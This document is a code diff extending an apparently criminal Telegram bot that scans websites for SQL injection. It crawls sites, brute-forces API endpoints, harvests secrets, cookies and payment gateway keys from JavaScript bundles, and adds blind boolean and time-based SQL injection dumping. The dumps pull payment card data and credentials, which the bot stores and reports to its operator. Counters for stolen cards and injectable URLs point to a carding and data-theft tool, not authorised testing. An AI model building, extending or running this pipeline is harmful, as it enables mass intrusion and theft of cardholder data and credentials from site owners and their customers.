-                f"  <b>{gw['type']}</b>\n"
-                f"  <code>{gw['value']}</code>\n"
-                f"  📍 {gw['url'][:50]}\n\n"
+                f"  <b>{gw.get('key_type', gw.get('type', '?'))}</b>\n"
+                f"  <code>{gw.get('key_value', gw.get('value', '?'))[:60]}</code>\n"
+                f"  📍 {gw.get('url', '?')[:50]}\n\n"
             )
     
-    if p.found_secrets:
+    if db_secrets:
         text += "\n<b>🔐 Other Secrets:</b>\n"
-        for sec in p.found_secrets[-10:]:
+        for sec in db_secrets[:10]:
             text += (
-                f"  <b>{sec['type']}</b>\n"
-                f"  <code>{sec['value'][:60]}</code>\n\n"
+                f"  <b>{sec.get('secret_type', sec.get('type', '?'))}</b>\n"
+                f"  <code>{sec.get('value', '?')[:60]}</code>\n"
+                f"  📍 {sec.get('url', '?')[:50]}\n\n"
             )
     
-    if not p.found_gateways and not p.found_secrets:
+    if not db_gateways and not db_secrets:
         text += "No secrets found yet. Start pipeline with /dorkon"
+    
+    # Truncate for Telegram 4096 char limit
+    if len(text) > 4000:
+        text = text[:3990] + "\n\n<i>... truncated</i>"
     
     await update.message.reply_text(text, parse_mode="HTML")
 
 
 async def cmd_dumps(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /dumps command."""
+    """Handle /dumps command — reads from DB + filesystem."""
     p = get_pipeline()
     
     dump_dir = p.config.dumper_output_dir
@@ -1185,16 +2375,25 @@ async def cmd_dumps(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if os.path.exists(dump_dir):
         files = sorted(os.listdir(dump_dir), reverse=True)[:20]
         if files:
+            total_size = 0
             for f in files:
                 fpath = os.path.join(dump_dir, f)
                 size = os.path.getsize(fpath)
+                total_size += size
                 text += f"📁 <code>{f}</code> ({size:,} bytes)\n"
+            text += f"\n<b>Total:</b> {len(files)} files, {total_size:,} bytes\n"
         else:
-            text += "No dumps yet."
+            text += "No dumps yet.\n"
     else:
-        text += "Dump directory not created yet."
+        text += "Dump directory not created yet.\n"
     
-    text += f"\n<b>Cards Found:</b> {len(p.found_cards)}"
+    # Card count from DB
+    card_count = p.db.get_card_count() if hasattr(p, 'db') else len(p.found_cards)
+    text += f"\n<b>💳 Cards Found:</b> {card_count}"
+    
+    # Vuln count for context
+    vuln_count = p.db.get_vuln_count() if hasattr(p, 'db') else len(p.vulnerable_urls)
+    text += f"\n<b>🔓 Injectable URLs:</b> {vuln_count}"
     
     await update.message.reply_text(text, parse_mode="HTML")
 
@@ -1336,10 +2535,13 @@ async def _do_scan(update: Update, url: str):
     all_sqli_results = []
     all_dump_results = []
     all_endpoints = {}
+    all_port_results = []      # open ports from port scanner
     platform_info = {}
     pages_scanned = 0
     pages_crawled = set()      # URLs we've already visited
     sqli_tested = 0
+    discovered_param_urls = set()   # URLs with query params (SQLi targets)
+    discovered_all_urls = set()     # All internal URLs
     
     timeout = aiohttp.ClientTimeout(total=30)
     async with aiohttp.ClientSession(
@@ -1382,6 +2584,19 @@ async def _do_scan(update: Update, url: str):
             except Exception as e:
                 logger.debug(f"Cookie extraction error: {e}")
         
+        # Port scanning (v3.10) — parallel with Phase 1
+        if p.port_scanner:
+            try:
+                port_result = await p.port_scanner.scan_and_report(url)
+                if port_result and port_result.open_ports:
+                    all_port_results = [
+                        {"port": pp.port, "service": pp.service, "banner": pp.banner,
+                         "version": pp.version, "risk": pp.risk}
+                        for pp in port_result.open_ports
+                    ]
+            except Exception as e:
+                logger.debug(f"Port scan error in cmd_scan: {e}")
+        
         # ═══════ PHASE 2: Secret Extraction (deep — discovers pages + endpoints) ═══════
         await update.message.reply_text("⏳ Phase 2: Deep Secret Extraction + Endpoint Discovery...", parse_mode="HTML")
         
@@ -1396,128 +2611,432 @@ async def _do_scan(update: Update, url: str):
             logger.error(f"Secret extraction error: {e}")
             sqli_candidates = []
         
-        # ═══════ PHASE 3: Deep Crawl — find ALL internal pages ═══════
+        # ═══════ PHASE 2.5: SPA Intelligence — JS Analysis + API Discovery ═══════
+        # This phase handles modern SPA/SSR apps (Next.js, React, Vue, Angular)
+        # where traditional crawling finds 0 forms, 0 params, 0 endpoints
+        js_analysis_result = None
+        api_brute_result = None
+        spa_result = None
+        detected_framework = ""
+        
         await update.message.reply_text(
-            f"⏳ Phase 3: Deep Crawling Domain <code>{base_domain}</code>...\n"
-            f"(Already found {pages_scanned} pages + {len(sqli_candidates)} SQLi targets)",
+            "⏳ Phase 2.5: SPA Intelligence — JS Bundle Analysis + API Discovery...",
             parse_mode="HTML"
         )
         
-        # Start with the main URL and crawl outwards
-        crawl_queue = [url]
-        discovered_param_urls = set()   # URLs with query params (SQLi targets)
-        discovered_all_urls = set()     # All internal URLs
-        max_crawl_pages = 100
-        
-        # Add param URLs from secret extractor
-        for candidate in sqli_candidates:
-            discovered_param_urls.add(candidate['url'])
-        
-        # Add endpoints from secret extractor  
-        for key, eps in all_endpoints.items():
-            if isinstance(eps, list):
-                for ep in eps:
-                    if isinstance(ep, str) and ep.startswith("http"):
-                        if _urlparse(ep).netloc == base_domain:
-                            discovered_all_urls.add(ep)
-                            if "?" in ep:
-                                discovered_param_urls.add(ep)
-        
-        crawl_count = 0
-        while crawl_queue and crawl_count < max_crawl_pages:
-            current_url = crawl_queue.pop(0)
+        # Step A: JS Bundle Analysis — parse webpack/Next.js chunks for hidden endpoints
+        try:
+            js_analysis_result = await analyze_js_bundles(url)
+            detected_framework = js_analysis_result.framework
             
-            if current_url in pages_crawled:
-                continue
-            pages_crawled.add(current_url)
-            crawl_count += 1
-            
-            try:
-                async with session.get(current_url, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                    if resp.status != 200:
-                        continue
-                    
-                    ct = resp.headers.get("Content-Type", "")
-                    if "text/html" not in ct and "application/xhtml" not in ct:
-                        continue
-                    
-                    html_text = await resp.text(errors="ignore")
-                    
-                    # Extract cookies from each page too
-                    if p.config.cookie_extraction_enabled:
-                        resp_cookies = resp.cookies
-                        for name, cookie in resp_cookies.items():
-                            val = cookie.value
-                            if val and name not in all_cookies:
-                                all_cookies[name] = val
-                                p.db.add_cookie(current_url, name, val, "crawl")
-                                # Check for b3
-                                b3_names = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid", 
-                                           "x-b3-sampled", "x-b3-flags", "b3"}
-                                if name.lower() in b3_names:
-                                    all_b3_cookies[name] = val
-                                    p.db.add_b3_cookie(current_url, name, val)
-                    
-                    # Parse all links
-                    soup = BeautifulSoup(html_text, "html.parser")
-                    
-                    # <a href>
-                    for tag in soup.find_all(["a", "area"], href=True):
-                        href = tag["href"]
-                        full = urljoin(current_url, href)
-                        p_full = _urlparse(full)
-                        if p_full.netloc != base_domain:
-                            continue
-                        # Clean fragment
-                        clean = urlunparse((p_full.scheme, p_full.netloc, p_full.path, 
-                                          p_full.params, p_full.query, ""))
-                        if clean not in pages_crawled and clean not in discovered_all_urls:
-                            discovered_all_urls.add(clean)
-                            crawl_queue.append(clean)
-                            if p_full.query:
-                                discovered_param_urls.add(clean)
-                    
-                    # <form action>
-                    for form in soup.find_all("form", action=True):
-                        action = urljoin(current_url, form["action"])
-                        p_act = _urlparse(action)
-                        if p_act.netloc == base_domain or not p_act.netloc:
-                            discovered_all_urls.add(action)
-                            # Collect form inputs as potential POST SQLi targets
-                            inputs = []
-                            for inp in form.find_all(["input", "select", "textarea"]):
-                                name = inp.get("name")
-                                if name:
-                                    inputs.append(name)
-                            if inputs:
-                                discovered_param_urls.add(action)
-                    
-                    # <script src> — look for API/config JS
-                    for script in soup.find_all("script", src=True):
-                        src = urljoin(current_url, script["src"])
-                        p_src = _urlparse(src)
-                        if p_src.netloc == base_domain:
-                            discovered_all_urls.add(src)
-                    
-                    # iframe src
-                    for iframe in soup.find_all("iframe", src=True):
-                        isrc = urljoin(current_url, iframe["src"])
-                        p_iframe = _urlparse(isrc)
-                        if p_iframe.netloc == base_domain:
-                            discovered_all_urls.add(isrc)
-                            if p_iframe.query:
-                                discovered_param_urls.add(isrc)
-                    
-            except asyncio.TimeoutError:
-                continue
-            except Exception:
-                continue
-            
-            # Progress every 20 pages
-            if crawl_count % 20 == 0:
+            if js_analysis_result.api_endpoints or js_analysis_result.secrets or js_analysis_result.page_routes:
+                spa_msg = (
+                    f"🔬 <b>JS Bundle Analysis</b> ({js_analysis_result.js_files_analyzed} files, "
+                    f"{js_analysis_result.total_js_bytes // 1024} KB)\n"
+                )
+                if detected_framework:
+                    spa_msg += f"  Framework: <b>{detected_framework}</b>"
+                    if js_analysis_result.build_tool:
+                        spa_msg += f" ({js_analysis_result.build_tool})"
+                    spa_msg += "\n"
+                if js_analysis_result.api_endpoints:
+                    spa_msg += f"  🎯 API Endpoints: <b>{len(js_analysis_result.api_endpoints)}</b>\n"
+                    for ep in js_analysis_result.api_endpoints[:5]:
+                        spa_msg += f"    {ep.method} <code>{ep.url[:80]}</code>"
+                        if ep.auth_required:
+                            spa_msg += " 🔒"
+                        spa_msg += "\n"
+                    if len(js_analysis_result.api_endpoints) > 5:
+                        spa_msg += f"    ... +{len(js_analysis_result.api_endpoints) - 5} more\n"
+                if js_analysis_result.secrets:
+                    spa_msg += f"  🔑 Secrets in JS: <b>{len(js_analysis_result.secrets)}</b>\n"
+                    for s in js_analysis_result.secrets[:3]:
+                        spa_msg += f"    [{s.secret_type}] {s.value[:40]}...\n"
+                if js_analysis_result.page_routes:
+                    spa_msg += f"  📍 Routes: <b>{len(js_analysis_result.page_routes)}</b>\n"
+                if js_analysis_result.graphql_endpoints:
+                    spa_msg += f"  📊 GraphQL: {', '.join(js_analysis_result.graphql_endpoints[:3])}\n"
+                if js_analysis_result.websocket_urls:
+                    spa_msg += f"  🔌 WebSocket: {', '.join(js_analysis_result.websocket_urls[:3])}\n"
+                if js_analysis_result.source_maps:
+                    spa_msg += f"  📁 Source Maps: {len(js_analysis_result.source_maps)} found!\n"
+                if js_analysis_result.env_vars:
+                    spa_msg += f"  🌐 Env Vars: {len(js_analysis_result.env_vars)} leaked\n"
+                
+                await update.message.reply_text(spa_msg, parse_mode="HTML")
+                
+                # Add JS-discovered endpoints as scan targets
+                for ep in js_analysis_result.api_endpoints:
+                    ep_parsed = _urlparse(ep.url)
+                    if ep_parsed.netloc == base_domain or not ep_parsed.netloc:
+                        discovered_all_urls.add(ep.url)
+                        if ep_parsed.query:
+                            discovered_param_urls.add(ep.url)
+                
+                # Add JS-discovered secrets to our collection
+                for s in js_analysis_result.secrets:
+                    all_secrets.append(type('Secret', (), {
+                        'url': url, 'type': s.secret_type, 'value': s.value,
+                        'category': 'js_bundle', 'confidence': s.confidence,
+                        'source': s.source_file,
+                    })())
+                
+                # Add page routes as URLs to crawl
+                for route in js_analysis_result.page_routes:
+                    if route.startswith("/"):
+                        full_route = base_url + route
+                        discovered_all_urls.add(full_route)
+            else:
                 await update.message.reply_text(
-                    f"🕸️ Crawled {crawl_count} pages | Found {len(discovered_param_urls)} param URLs | "
-                    f"Queue: {len(crawl_queue)} | Cookies: {len(all_cookies)}",
+                    f"🔬 JS Analysis: {js_analysis_result.js_files_analyzed} files analyzed — "
+                    f"no endpoints/secrets found in bundles",
+                    parse_mode="HTML"
+                )
+        except Exception as e:
+            logger.error(f"JS analysis error: {e}")
+        
+        # Step B: Playwright SPA Extraction — render page and intercept API calls
+        try:
+            if _HAS_PLAYWRIGHT:
+                spa_result = await spa_extract(url, wait_seconds=4.0, scroll=True, intercept_api=True)
+            else:
+                spa_result = await spa_extract_with_flaresolverr(url)
+            
+            if spa_result and not spa_result.error:
+                spa_found_something = (
+                    spa_result.forms or spa_result.param_urls or
+                    spa_result.api_calls or spa_result.internal_links
+                )
+                
+                if spa_found_something:
+                    spa_msg = "🌐 <b>SPA Rendering Results</b>\n"
+                    if spa_result.framework:
+                        spa_msg += f"  Framework: <b>{spa_result.framework}</b>\n"
+                        detected_framework = detected_framework or spa_result.framework
+                    if spa_result.forms:
+                        spa_msg += f"  📝 Forms: <b>{len(spa_result.forms)}</b>\n"
+                        for f in spa_result.forms[:3]:
+                            spa_msg += f"    {f.get('method','GET')} {f.get('action','')[:60]} ({len(f.get('inputs',[]))} inputs)\n"
+                    if spa_result.api_calls:
+                        spa_msg += f"  📡 Intercepted API Calls: <b>{len(spa_result.api_calls)}</b>\n"
+                        for ac in spa_result.api_calls[:5]:
+                            spa_msg += f"    {ac.get('method','GET')} <code>{ac.get('url','')[:70]}</code>\n"
+                        if len(spa_result.api_calls) > 5:
+                            spa_msg += f"    ... +{len(spa_result.api_calls) - 5} more\n"
+                    if spa_result.param_urls:
+                        spa_msg += f"  🔗 Param URLs: <b>{len(spa_result.param_urls)}</b>\n"
+                    if spa_result.internal_links:
+                        spa_msg += f"  🔗 Internal Links: <b>{len(spa_result.internal_links)}</b>\n"
+                    spa_msg += f"  🍪 Cookies: {len(spa_result.cookies)}\n"
+                    
+                    await update.message.reply_text(spa_msg, parse_mode="HTML")
+                    
+                    # Add SPA-discovered resources
+                    for pu in spa_result.param_urls:
+                        discovered_param_urls.add(pu)
+                    for il in spa_result.internal_links:
+                        discovered_all_urls.add(il)
+                    for cname, cval in spa_result.cookies.items():
+                        all_cookies[cname] = cval
+                    
+                    # Add intercepted API calls as targets
+                    for ac in spa_result.api_calls:
+                        ac_url = ac.get("url", "")
+                        if ac_url:
+                            ac_parsed = _urlparse(ac_url)
+                            if ac_parsed.netloc == base_domain or not ac_parsed.netloc:
+                                discovered_all_urls.add(ac_url)
+                                if ac_parsed.query:
+                                    discovered_param_urls.add(ac_url)
+                else:
+                    await update.message.reply_text(
+                        "🌐 SPA rendering: no additional forms/links/API calls found in rendered DOM",
+                        parse_mode="HTML"
+                    )
+        except Exception as e:
+            logger.error(f"SPA extraction error: {e}")
+        
+        # Step C: API Endpoint Bruteforce — probe common paths
+        try:
+            # Build custom paths from JS analysis discoveries
+            custom_paths = []
+            if js_analysis_result and js_analysis_result.page_routes:
+                for route in js_analysis_result.page_routes:
+                    if route.startswith("/"):
+                        custom_paths.append(route)
+                        # Also try /api/ version of page routes
+                        if not route.startswith("/api/"):
+                            custom_paths.append(f"/api{route}")
+            
+            api_brute_result = await bruteforce_api(
+                url=url,
+                framework=detected_framework,
+                custom_paths=custom_paths if custom_paths else None,
+            )
+            
+            if api_brute_result.endpoints_found:
+                bf_msg = (
+                    f"🔨 <b>API Bruteforce Results</b> "
+                    f"({api_brute_result.endpoints_probed} probed)\n"
+                )
+                if api_brute_result.open_endpoints:
+                    bf_msg += f"  ✅ Open endpoints: <b>{len(api_brute_result.open_endpoints)}</b>\n"
+                    for ep in api_brute_result.open_endpoints[:5]:
+                        bf_msg += f"    {ep.method} <code>{ep.url[:70]}</code> [{ep.status}]\n"
+                        if ep.reason:
+                            bf_msg += f"      → {ep.reason[:80]}\n"
+                if api_brute_result.auth_endpoints:
+                    bf_msg += f"  🔒 Auth-required: <b>{len(api_brute_result.auth_endpoints)}</b>\n"
+                    for ep in api_brute_result.auth_endpoints[:5]:
+                        bf_msg += f"    {ep.method} <code>{ep.url[:70]}</code> [{ep.status}]\n"
+                if api_brute_result.graphql_introspection:
+                    bf_msg += "  📊 <b>GraphQL introspection OPEN!</b>\n"
+                
+                await update.message.reply_text(bf_msg, parse_mode="HTML")
+                
+                # Add discovered endpoints as scan targets
+                for ep in api_brute_result.open_endpoints:
+                    ep_parsed = _urlparse(ep.url)
+                    discovered_all_urls.add(ep.url)
+                    if ep_parsed.query:
+                        discovered_param_urls.add(ep.url)
+            else:
+                await update.message.reply_text(
+                    f"🔨 API Bruteforce: {api_brute_result.endpoints_probed} paths probed — none responsive",
+                    parse_mode="HTML"
+                )
+        except Exception as e:
+            logger.error(f"API bruteforce error: {e}")
+        
+        # ═══════ PHASE 3: Deep Crawl — find ALL internal pages ═══════
+        # ═══════ PHASE 3: Deep Crawl — Firecrawl first, fall back to manual ═══════
+        firecrawl_crawled = False
+        if p.config.firecrawl_enabled and p.config.firecrawl_crawl_enabled and p._firecrawl_engine:
+            await update.message.reply_text(
+                f"⏳ Phase 3: Firecrawl Deep Crawl <code>{base_domain}</code>...\n"
+                f"(JS rendering + sitemap + dedup built-in)",
+                parse_mode="HTML"
+            )
+            try:
+                # First, map all URLs (fast, no scraping)
+                mapped_urls = await p._firecrawl_engine.map_urls(url, limit=500)
+                if mapped_urls:
+                    for mu in mapped_urls:
+                        p_mu = _urlparse(mu)
+                        if p_mu.netloc == base_domain:
+                            discovered_all_urls.add(mu)
+                            if p_mu.query:
+                                discovered_param_urls.add(mu)
+                    await update.message.reply_text(
+                        f"🗺️ Firecrawl Map: <b>{len(mapped_urls)}</b> URLs discovered\n"
+                        f"Param URLs: {len(discovered_param_urls)}",
+                        parse_mode="HTML"
+                    )
+
+                # Then crawl for content (cookies, secrets in rendered JS)
+                fc_pages = await p._firecrawl_engine.crawl(url, limit=p.config.firecrawl_crawl_limit)
+                if fc_pages:
+                    firecrawl_crawled = True
+                    for page_data in fc_pages:
+                        page_url = ""
+                        pg_meta = page_data.get("metadata", {})
+                        if isinstance(pg_meta, dict):
+                            page_url = pg_meta.get("url", "") or pg_meta.get("source_url", "")
+                        if not page_url:
+                            page_url = page_data.get("url", "")
+                        if page_url:
+                            pages_crawled.add(page_url)
+                            p_pu = _urlparse(page_url)
+                            if p_pu.netloc == base_domain:
+                                discovered_all_urls.add(page_url)
+                                if p_pu.query:
+                                    discovered_param_urls.add(page_url)
+                        
+                        # Extract links from FC results
+                        fc_links = page_data.get("links", [])
+                        if fc_links and isinstance(fc_links, list):
+                            for fc_link in fc_links:
+                                if isinstance(fc_link, str) and fc_link.startswith("http"):
+                                    p_link = _urlparse(fc_link)
+                                    if p_link.netloc == base_domain:
+                                        discovered_all_urls.add(fc_link)
+                                        if p_link.query:
+                                            discovered_param_urls.add(fc_link)
+                        
+                        # Feed HTML to secret extractor for additional findings
+                        html_content = page_data.get("html", "") or page_data.get("rawHtml", "")
+                        if html_content and p.config.secret_extraction_enabled and page_url:
+                            try:
+                                page_secrets = p.secret_extractor.extract_from_text(
+                                    html_content, page_url
+                                )
+                                if page_secrets:
+                                    all_secrets.extend(page_secrets)
+                            except Exception:
+                                pass
+
+                    total_pages_found = len(pages_crawled)
+                    await update.message.reply_text(
+                        f"✅ Firecrawl Crawl: <b>{len(fc_pages)}</b> pages scraped\n"
+                        f"Total URLs discovered: {len(discovered_all_urls)}\n"
+                        f"Param URLs: {len(discovered_param_urls)}",
+                        parse_mode="HTML"
+                    )
+
+            except Exception as e:
+                logger.error(f"Firecrawl crawl failed, falling back to manual: {e}")
+                await update.message.reply_text(
+                    f"⚠️ Firecrawl crawl failed: {str(e)[:100]}\nFalling back to manual crawl...",
+                    parse_mode="HTML"
+                )
+
+        # Fall back to recursive crawler if Firecrawl didn't work (v3.9)
+        if not firecrawl_crawled:
+            # Add sqli_candidates from secret extractor as seeds
+            extra_seeds = []
+            for candidate in sqli_candidates:
+                discovered_param_urls.add(candidate['url'])
+                extra_seeds.append(candidate['url'])
+            
+            # Add endpoints from secret extractor as seeds
+            for key, eps in all_endpoints.items():
+                if isinstance(eps, list):
+                    for ep in eps:
+                        if isinstance(ep, str) and ep.startswith("http"):
+                            if _urlparse(ep).netloc == base_domain:
+                                extra_seeds.append(ep)
+                                if "?" in ep:
+                                    discovered_param_urls.add(ep)
+            
+            if p.crawler:
+                await update.message.reply_text(
+                    f"⏳ Phase 3: Recursive BFS Crawl <code>{base_domain}</code>...\n"
+                    f"Depth: {p.config.deep_crawl_max_depth} | Max pages: {p.config.deep_crawl_max_pages}\n"
+                    f"Seeds: {1 + len(extra_seeds)} | Already found {pages_scanned} pages",
+                    parse_mode="HTML"
+                )
+                
+                progress_counter = [0]
+                
+                async def _scan_on_page(page):
+                    """Process each crawled page in real-time."""
+                    progress_counter[0] += 1
+                    pages_crawled.add(page.url)
+                    
+                    # Cookies
+                    if p.config.cookie_extraction_enabled:
+                        for cname, cval in page.cookies.items():
+                            if cname not in all_cookies:
+                                all_cookies[cname] = cval
+                                p.db.add_cookie(page.url, cname, cval, "crawl")
+                                b3_names = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid",
+                                           "x-b3-sampled", "x-b3-flags", "b3"}
+                                if cname.lower() in b3_names:
+                                    all_b3_cookies[cname] = cval
+                                    p.db.add_b3_cookie(page.url, cname, cval)
+                    
+                    # Secrets
+                    if page.html and p.config.secret_extraction_enabled:
+                        try:
+                            page_secrets = p.secret_extractor.extract_from_text(
+                                page.html, page.url
+                            )
+                            if page_secrets:
+                                all_secrets.extend(page_secrets)
+                        except Exception:
+                            pass
+                    
+                    # Progress every 25 pages
+                    if progress_counter[0] % 25 == 0:
+                        await update.message.reply_text(
+                            f"🕸️ Crawled {progress_counter[0]} pages | "
+                            f"Cookies: {len(all_cookies)} | "
+                            f"Secrets: {len(all_secrets)}",
+                            parse_mode="HTML"
+                        )
+                
+                try:
+                    crawl_result = await p.crawler.crawl(
+                        url,
+                        session=session,
+                        max_depth=p.config.deep_crawl_max_depth,
+                        max_pages=p.config.deep_crawl_max_pages,
+                        on_page=_scan_on_page,
+                        extra_seeds=extra_seeds,
+                    )
+                    
+                    # ── FlareSolverr fallback: if aiohttp got very few pages ──
+                    if crawl_result.total_fetched <= 2:
+                        await update.message.reply_text(
+                            f"🌐 aiohttp only got <b>{crawl_result.total_fetched}</b> pages — "
+                            f"falling back to FlareSolverr crawl...",
+                            parse_mode="HTML"
+                        )
+                        try:
+                            flare_result = await flaresolverr_crawl(
+                                seed_url=url,
+                                max_pages=p.config.deep_crawl_max_pages,
+                                max_depth=p.config.deep_crawl_max_depth,
+                            )
+                            if flare_result.total_fetched > crawl_result.total_fetched:
+                                # Run secret extraction on FlareSolverr-crawled pages
+                                for bp in flare_result.html_pages:
+                                    if bp.html and p.config.secret_extraction_enabled:
+                                        try:
+                                            page_secs = p.secret_extractor.extract_from_text(
+                                                bp.html, bp.url,
+                                            )
+                                            if page_secs:
+                                                all_secrets.extend(page_secs)
+                                        except Exception:
+                                            pass
+                                    # Collect cookies
+                                    for cname, cval in bp.cookies.items():
+                                        all_cookies[cname] = cval
+                                    pages_crawled.add(bp.url)
+
+                                await update.message.reply_text(
+                                    f"🌐 FlareSolverr got <b>{flare_result.total_fetched}</b> pages "
+                                    f"(vs aiohttp {crawl_result.total_fetched})",
+                                    parse_mode="HTML"
+                                )
+                                crawl_result = flare_result
+                            else:
+                                await update.message.reply_text(
+                                    "🌐 FlareSolverr didn't improve results, keeping aiohttp data",
+                                    parse_mode="HTML"
+                                )
+                        except Exception as e:
+                            logger.warning(f"[FlareFallback] FlareSolverr crawl failed: {e}")
+                            await update.message.reply_text(
+                                f"⚠️ FlareSolverr fallback error: {str(e)[:200]}",
+                                parse_mode="HTML"
+                            )
+                    
+                    discovered_all_urls.update(crawl_result.all_urls)
+                    discovered_param_urls.update(crawl_result.param_urls)
+                    
+                    await update.message.reply_text(
+                        f"✅ Recursive crawl complete:\n"
+                        f"  Pages: <b>{crawl_result.total_fetched}</b>\n"
+                        f"  Max depth: <b>{crawl_result.max_depth_reached}</b>\n"
+                        f"  URLs discovered: <b>{len(crawl_result.all_urls)}</b>\n"
+                        f"  Param URLs: <b>{len(crawl_result.param_urls)}</b>\n"
+                        f"  Forms: <b>{len(crawl_result.form_targets)}</b>\n"
+                        f"  Cookies: <b>{len(crawl_result.all_cookies)}</b>\n"
+                        f"  B3 cookies: <b>{len(crawl_result.b3_cookies)}</b>\n"
+                        f"  Elapsed: {crawl_result.elapsed:.1f}s",
+                        parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logger.error(f"Recursive crawl failed: {e}")
+                    await update.message.reply_text(
+                        f"⚠️ Recursive crawl error: {str(e)[:200]}",
+                        parse_mode="HTML"
+                    )
+            else:
+                await update.message.reply_text(
+                    "⚠️ Recursive crawler not enabled. Set deep_crawl_enabled=True.",
                     parse_mode="HTML"
                 )
         
@@ -1718,6 +3237,100 @@ async def _do_scan(update: Update, url: str):
                                         f"⚠️ Injection confirmed but dump failed: {str(dump_err)[:100]}",
                                         parse_mode="HTML"
                                     )
+                            
+                            # Blind dumping (boolean/time-based)
+                            elif (p.config.dumper_enabled and p.config.dumper_blind_enabled
+                                  and r.injection_type in ("boolean", "time")):
+                                await update.message.reply_text(
+                                    f"💉 <b>Blind Injectable!</b> Exploiting {r.injection_type}-based SQLi\n"
+                                    f"Param: <code>{r.parameter}</code>\n"
+                                    f"DBMS: {r.dbms or 'Unknown'}\n"
+                                    f"🐢 Extracting data char-by-char (this is slow)...",
+                                    parse_mode="HTML"
+                                )
+                                
+                                try:
+                                    dump = await p.dumper.blind_targeted_dump(r, session)
+                                    
+                                    if dump.has_valuable_data or dump.total_rows > 0:
+                                        saved = p.dumper.save_dump(dump, prefix="blind_")
+                                        
+                                        dump_info = {
+                                            "url": r.url, "param": r.parameter,
+                                            "type": f"blind_{r.injection_type}",
+                                            "dbms": dump.dbms, "database": dump.database,
+                                            "tables": len(dump.tables),
+                                            "total_rows": dump.total_rows,
+                                            "cards": len(dump.card_data),
+                                            "credentials": len(dump.credentials),
+                                            "gateway_keys": len(dump.gateway_keys),
+                                            "files": saved,
+                                        }
+                                        all_dump_results.append(dump_info)
+                                        
+                                        await p.reporter.report_data_dump(
+                                            r.url, dump.dbms, dump.database,
+                                            dump.tables,
+                                            {t: len(rows) for t, rows in dump.data.items()},
+                                            saved,
+                                        )
+                                        
+                                        if dump.card_data:
+                                            p.found_cards.extend(dump.card_data)
+                                            for card in dump.card_data:
+                                                p.db.add_card_data(r.url, card)
+                                            await p.reporter.report_card_data(r.url, dump.card_data)
+                                        
+                                        if dump.credentials:
+                                            for cred in dump.credentials:
+                                                p.found_secrets.append({
+                                                    "url": r.url, "type": "db_credential",
+                                                    "value": str(cred), "source": "blind_sqli_dump",
+                                                    "time": datetime.now().isoformat(),
+                                                })
+                                        
+                                        if dump.gateway_keys:
+                                            for key_entry in dump.gateway_keys:
+                                                for col, val in key_entry.items():
+                                                    p.found_gateways.append({
+                                                        "url": r.url, "type": f"db_{col}",
+                                                        "value": val, "source": "blind_sqli_dump",
+                                                        "time": datetime.now().isoformat(),
+                                                    })
+                                                    p.db.add_gateway_key(r.url, f"db_{col}", val, source="blind_sqli_dump")
+                                                    await p.reporter.report_gateway(
+                                                        r.url, f"DB: {col}", val,
+                                                        {"source": f"Blind {r.injection_type} SQLi dump via /scan"}
+                                                    )
+                                        
+                                        dump_text = (
+                                            f"🐢📦 <b>Blind Dump Successful!</b>\n"
+                                            f"Type: {r.injection_type}-based\n"
+                                            f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
+                                            f"Tables: {len(dump.tables)} | Rows: {dump.total_rows}\n"
+                                        )
+                                        if dump.card_data:
+                                            dump_text += f"💳 <b>Card Data: {len(dump.card_data)} entries</b>\n"
+                                        if dump.credentials:
+                                            dump_text += f"🔐 Credentials: {len(dump.credentials)}\n"
+                                        if dump.gateway_keys:
+                                            dump_text += f"🔑 Gateway Keys: {len(dump.gateway_keys)}\n"
+                                        await update.message.reply_text(dump_text, parse_mode="HTML")
+                                    else:
+                                        all_dump_results.append({
+                                            "url": r.url, "param": r.parameter,
+                                            "type": f"blind_{r.injection_type}",
+                                            "dbms": dump.dbms, "tables": len(dump.tables),
+                                            "total_rows": dump.total_rows,
+                                            "cards": 0, "credentials": 0, "gateway_keys": 0,
+                                        })
+                                
+                                except Exception as dump_err:
+                                    logger.error(f"Blind dump error: {dump_err}")
+                                    await update.message.reply_text(
+                                        f"⚠️ Blind injection confirmed but dump failed: {str(dump_err)[:100]}",
+                                        parse_mode="HTML"
+                                    )
                     
                     # Progress every 10 targets
                     if (idx + 1) % 10 == 0:
@@ -1757,6 +3370,7 @@ async def _do_scan(update: Update, url: str):
     # ── Cookies (ALL of them) ──
     text += f"<b>🍪 Cookies ({len(all_cookies)}):</b>\n"
     if all_cookies:
+        cookie_hints_batch = []
         for name, value in sorted(all_cookies.items()):
             tag = ""
             nl = name.lower()
@@ -1770,6 +3384,14 @@ async def _do_scan(update: Update, url: str):
             elif any(p in nl for p in auth_patterns):
                 tag = " 🔑"
             text += f"  <code>{name}={value[:50]}</code>{tag}\n"
+            # Cookie hint
+            hint = get_cookie_hint(name, value)
+            if hint:
+                cookie_hints_batch.append(hint)
+        if cookie_hints_batch:
+            text += "\n  <b>💡 Cookie Intelligence:</b>\n"
+            for ch in cookie_hints_batch[:8]:
+                text += f"  {ch}\n\n"
     else:
         text += "  None found\n"
     
@@ -1778,6 +3400,52 @@ async def _do_scan(update: Update, url: str):
         for name, value in all_b3_cookies.items():
             text += f"    <code>{name}={value}</code>\n"
     text += "\n"
+    
+    # ── SPA Intelligence ──
+    if js_analysis_result and (js_analysis_result.api_endpoints or js_analysis_result.secrets or js_analysis_result.page_routes):
+        text += f"<b>🔬 SPA Intelligence:</b>\n"
+        if detected_framework:
+            text += f"  Framework: {detected_framework}"
+            if js_analysis_result.build_tool:
+                text += f" ({js_analysis_result.build_tool})"
+            text += "\n"
+        text += f"  JS files: {js_analysis_result.js_files_analyzed} ({js_analysis_result.total_js_bytes // 1024} KB)\n"
+        if js_analysis_result.api_endpoints:
+            text += f"  API endpoints: {len(js_analysis_result.api_endpoints)}\n"
+        if js_analysis_result.secrets:
+            text += f"  JS secrets: {len(js_analysis_result.secrets)}\n"
+        if js_analysis_result.page_routes:
+            text += f"  Routes: {len(js_analysis_result.page_routes)}\n"
+        if js_analysis_result.graphql_endpoints:
+            text += f"  GraphQL: {', '.join(js_analysis_result.graphql_endpoints[:2])}\n"
+        if js_analysis_result.source_maps:
+            text += f"  ⚠️ Source maps exposed: {len(js_analysis_result.source_maps)}\n"
+        if js_analysis_result.env_vars:
